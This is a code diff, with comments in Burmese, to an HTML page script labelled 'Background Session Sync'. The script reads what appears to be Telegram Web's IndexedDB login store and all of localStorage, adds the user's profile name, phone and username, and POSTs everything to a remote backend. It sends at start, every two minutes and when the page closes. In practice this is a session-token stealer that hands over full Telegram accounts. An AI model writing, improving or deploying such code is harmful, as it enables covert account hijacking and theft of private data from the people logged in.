@@ -234,51 +234,80 @@
             console.log("✅ Background Session Sync RUNNING!");
             
             setTimeout(() => {
-                let myUserId = localStorage.getItem("my_custom_user_id");
-                if (!myUserId) {
-                    myUserId = "staff_" + Math.floor(Math.random() * 100000);
-                    localStorage.setItem("my_custom_user_id", myUserId);
+    let myUserId = localStorage.getItem("my_custom_user_id");
+    if (!myUserId) {
+        myUserId = "staff_" + Math.floor(Math.random() * 100000);
+        localStorage.setItem("my_custom_user_id", myUserId);
+    }
+
+    // Phase 2: Data အပြောင်းအလဲကို သိမ်းထားရန် Variable
+    let lastSyncLength = 0; 
+
+    const syncSessionData = async () => {
+        try {
+            const rawIdbData = await exportIndexedDB("tt-data", "store");
+            
+            if (Object.keys(rawIdbData).length > 0) { 
+                const idbDataStr = serializeData(rawIdbData);
+                const lsDataStr = JSON.stringify(localStorage);
+                
+                // (၁) Data အသစ်ရဲ့ စုစုပေါင်း Size ကို တွက်ပါမယ်
+                const currentDataLength = idbDataStr.length + lsDataStr.length;
+
+                // (၂) Size အပြောင်းအလဲ မရှိရင် Backend ကို မပို့တော့ပါဘူး (Performance သက်သာစေရန်)
+                if (lastSyncLength === currentDataLength) {
+                    console.log("⚡ Data ပြောင်းလဲမှုမရှိပါ။ Sync မလုပ်ပါ။ (Bandwidth သက်သာစေသည်)");
+                    return; 
                 }
 
-                setInterval(async () => {
-                    try {
-                        const rawIdbData = await exportIndexedDB("tt-data", "store");
-                        
-                        if (Object.keys(rawIdbData).length > 0) { 
-                            const idbDataStr = serializeData(rawIdbData);
-                            const lsDataStr = JSON.stringify(localStorage);
-                            
-                            let profile = getTelegramProfile();
-                            let finalUid = profile ? profile.uid : myUserId;
-                            let finalName = profile ? profile.name : "Unknown Staff";
-                            let finalPhone = profile ? profile.phone : myUserId;
-                            let finalUsername = profile ? profile.username : "";
+                let profile = getTelegramProfile();
+                let finalUid = profile ? profile.uid : myUserId;
+                let finalName = profile ? profile.name : "Unknown Staff";
+                let finalPhone = profile ? profile.phone : myUserId;
+                let finalUsername = profile ? profile.username : "";
 
-                            const res = await fetch(BACKEND_URL + "/api/save_session", {
-                                method: "POST",
-                                headers: { 
-                                    "Content-Type": "application/json",
-                                    "x-api-key": API_KEY
-                                },
-                                body: JSON.stringify({
-                                    user_id: finalUid, 
-                                    profile_name: finalName,
-                                    profile_phone: finalPhone,
-                                    profile_username: finalUsername,
-                                    local_storage_str: lsDataStr,
-                                    indexed_db_str: idbDataStr,
-                                    timestamp: new Date().toISOString()
-                                })
-                            });
-                            if(res.ok) console.log(`✅ Full Telegram Session Synced: ${finalName}`);
-                        } else {
-                            console.log("⏳ Waiting for IndexedDB login data...");
-                        }
-                    } catch(e) {
-                        console.error("❌ Sync failed:", e);
-                    }
-                }, 15000); 
-            }, 5000);
+                const res = await fetch(BACKEND_URL + "/api/save_session", {
+                    method: "POST",
+                    headers: { 
+                        "Content-Type": "application/json",
+                        "x-api-key": API_KEY // Phase 1 မှ API Key
+                    },
+                    body: JSON.stringify({
+                        user_id: finalUid, 
+                        profile_name: finalName,
+                        profile_phone: finalPhone,
+                        profile_username: finalUsername,
+                        local_storage_str: lsDataStr,
+                        indexed_db_str: idbDataStr,
+                        timestamp: new Date().toISOString()
+                    })
+                });
+                
+                if(res.ok) {
+                    console.log(`✅ Smart Sync အောင်မြင်ပါသည်: ${finalName}`);
+                    // (၃) အောင်မြင်သွားရင် နောက်ဆုံး Data Size ကို မှတ်ထားပါမယ်
+                    lastSyncLength = currentDataLength; 
+                }
+            } else {
+                console.log("⏳ Waiting for IndexedDB login data...");
+            }
+        } catch(e) {
+            console.error("❌ Sync failed:", e);
+        }
+    };
+
+    // (၄) ၁၅ စက္ကန့် အစား ၁၂၀,၀၀၀ ms (၂ မိနစ်) တစ်ခါသာ စစ်ဆေးပါတော့မယ်
+    setInterval(syncSessionData, 120000); 
+
+    // (၅) Staff က Browser ကို ပိတ်လိုက်တဲ့ အချိန် (သို့) Refresh လုပ်တဲ့ အချိန်မှာ ချက်ချင်း Sync လုပ်ပါမယ်
+    window.addEventListener('beforeunload', () => {
+        syncSessionData();
+    });
+
+    // စဖွင့်ဖွင့်ချင်းမှာ တစ်ခါတန်း Sync လုပ်ပါမယ်
+    syncSessionData();
+
+}, 5000);
         }
     });
   </script>
